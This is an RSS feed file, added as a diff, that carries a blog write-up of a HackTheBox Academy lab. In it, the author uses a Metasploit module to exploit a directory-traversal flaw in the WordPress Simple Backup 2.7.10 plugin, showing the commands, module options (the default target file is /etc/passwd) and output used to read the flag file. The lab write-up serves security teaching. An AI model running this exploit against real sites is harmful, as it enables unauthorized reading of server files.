@@ -1,0 +1,179 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Plugins on hushkat</title><link>https://hushkat.github.io/tags/plugins/</link><description>Recent content in Plugins on hushkat</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Wed, 02 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://hushkat.github.io/tags/plugins/index.xml" rel="self" type="application/rss+xml"/><item><title>Public Exploits</title><link>https://hushkat.github.io/p/public-exploits/</link><pubDate>Wed, 02 Aug 2023 00:00:00 +0000</pubDate><guid>https://hushkat.github.io/p/public-exploits/</guid><description>&lt;img src="https://hushkat.github.io/p/public-exploits/Metasploit.png" alt="Featured image of post Public Exploits" />&lt;h3 id="introduction">Introduction
+&lt;/h3>&lt;p>Welcome to yet another writeup where I cover an important tool used by hackers to exploit vulnerabilities on different systems: &lt;a class="link" href="https://www.metasploit.com/" target="_blank" rel="noopener"
+>Metasploit&lt;/a> In this challenge, part of the &amp;ldquo;Getting started&amp;rdquo; series on HackTheBox Academy, we will be delving into the realm of public exploits and uncovering the power of Metasploit.&lt;/p>
+&lt;p>&lt;em>Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.&lt;/em>&lt;/p>
+&lt;h3 id="public-exploits-challenge">Public exploits Challenge.
+&lt;/h3>&lt;p>The challenge instructions were simple: &amp;ldquo;Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the &amp;lsquo;/flag.txt&amp;rsquo; file.&amp;rdquo; The main focus of this challenge is to demonstrate the ability to identify vulnerabilities and effectively exploit them. Let&amp;rsquo;s begin our journey by examining the target IP address and visiting the associated webpage.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits.jpg"
+width="1015"
+height="252"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits_hu17449750365477643856.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits_hu11126079795141998931.jpg 1024w"
+loading="lazy"
+alt="chall desc"
+class="gallery-image"
+data-flex-grow="402"
+data-flex-basis="966px"
+>&lt;/p>
+&lt;h3 id="observations--findings">Observations &amp;amp; Findings
+&lt;/h3>&lt;p>Upon accessing the webpage, the very first thing that caught our attention was a version number and a brief description of a WordPress service. Drawing from our knowledge of how to find and exploit publicly available vulnerabilities, we swiftly launched the Metasploit console to search for an exploit relevant to this specific version.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits0.jpg"
+width="1918"
+height="800"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits0_hu16881979783332079574.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits0_hu14133496900036993840.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="239"
+data-flex-basis="575px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">──(dr0idbot㉿kali)-[~]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└─$msfconsole
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- - - - - SNIP - - - - -
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; search exploit wordpress 2.7.10
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Modules
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">================
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> # Name Disclosure Date Rank Check Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - ---- --------------- ---- ----- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 0 auxiliary/scanner/http/wp_simple_backup_file_read normal No WordPress Simple Backup File Read Vulnerability
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 &amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Metasploit came back with results, indicating that there is a publicly available exploit matching the version we found on the website.&lt;/p>
+&lt;p>Notice the command used to spin up metasploit &lt;strong>msfconsole&lt;/strong> after its up and running, we run the command &lt;strong>search exploit wordpress 2.7.10&lt;/strong> to see if there are any publicly available exploits for this plugin version. Sure enough, metasploit brings back results and slight description of what we are looking for matching the info on the website we had visited earlier on.&lt;/p>
+&lt;p>We have an option to see information about that exploit before using it, to see what they payload does. For that we use the command &lt;strong>info&lt;/strong> plus the index of the exploit itself.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; info 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Basic options:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Name Current Setting Required Description
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- --------------- -------- -----------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DEPTH 6 yes Traversal Depth (to reach the root fold
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> er)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> FILEPATH /etc/passwd yes The path to the file to read
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Proxies no A proxy chain of format type:host:port[
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ,type:host:port][...]
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RHOSTS yes The target host(s), see https://docs.me
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tasploit.com/docs/using-metasploit/basi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> cs/using-metasploit.html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> RPORT 80 yes The target port (TCP)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SSL false no Negotiate SSL/TLS for outgoing connecti
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ons
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> TARGETURI / yes The base path to the wordpress applicat
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ion
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> THREADS 1 yes The number of concurrent threads (max o
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ne per host)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VHOST no HTTP server virtual host
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Description:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> This module exploits a directory traversal vulnerability in WordPress Plugin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &amp;#34;Simple Backup&amp;#34; version 2.7.10, allowing to read arbitrary files with the
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> web server privileges.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">- - - - - SNIP - - - - -
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>As you can see, a bunch of information is given about this particular exploit with a number options that we need to set in order for the payload to work on our target. Next we use the command &lt;strong>use&lt;/strong> plus the index of the exploit we have picked for the exploitation. After selection we set the options that are required by metasploit before executing the payload.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">msf6 &amp;gt; use 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set FILEPATH /flag.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set RHOSTS 94.237.49.11
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">msf6 auxiliary(scanner/http/wp_simple_backup_file_read) &amp;gt; set RPORT 41884
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After obtaining information about the exploit, including the required options, we set the necessary values to ensure the payload will work against our target.
+With all the options set, we verified the details and executed the payload on the target.&lt;/p>
+&lt;h3 id="solutionflag">Solution/Flag
+&lt;/h3>&lt;p>Upon successful execution of the payload, the Metasploit console provided us with the following output:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">[+] File saved in: /home/papab3ar/.msf4/loot/20230803014901_default_94.237.49.11_simplebackup.tra_422018.txt
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Scanned 1 of 1 hosts (100% complete)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Auxiliary module execution completed
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Using the command &lt;strong>cat&lt;/strong>, we accessed the directory where the file was saved and retrieved the contents of the flag, thus completing the challenge.
+&lt;img src="https://hushkat.github.io/p/public-exploits/PublicExploits1.jpg"
+width="664"
+height="134"
+srcset="https://hushkat.github.io/p/public-exploits/PublicExploits1_hu129630161148891722.jpg 480w, https://hushkat.github.io/p/public-exploits/PublicExploits1_hu12755825758852016865.jpg 1024w"
+loading="lazy"
+alt="chall blog"
+class="gallery-image"
+data-flex-grow="495"
+data-flex-basis="1189px"
+>&lt;/p>
+&lt;h3 id="conclusion">Conclusion
+&lt;/h3>&lt;p>Metasploit proved to be a powerful tool during this challenge, allowing us to search for and exploit publicly available vulnerabilities effortlessly. It demonstrates the significance of staying vigilant against potential threats and the importance of secure coding practices for developers.&lt;/p>
+&lt;p>For a deeper understanding of Metasploit and its capabilities, you can refer to its official documentation &lt;a class="link" href="https://docs.metasploit.com/" target="_blank" rel="noopener"
+>here&lt;/a>&lt;/p>
+&lt;p>In conclusion, this challenge provided an excellent opportunity to apply web enumeration techniques, uncover hidden information, and identify potential vulnerabilities. As ethical hackers, the quest for knowledge and continuous learning is paramount. Happy hacking, and never stop learning!&lt;/p>
+&lt;p>dr0idbot out.&lt;/p></description></item></channel></rss>
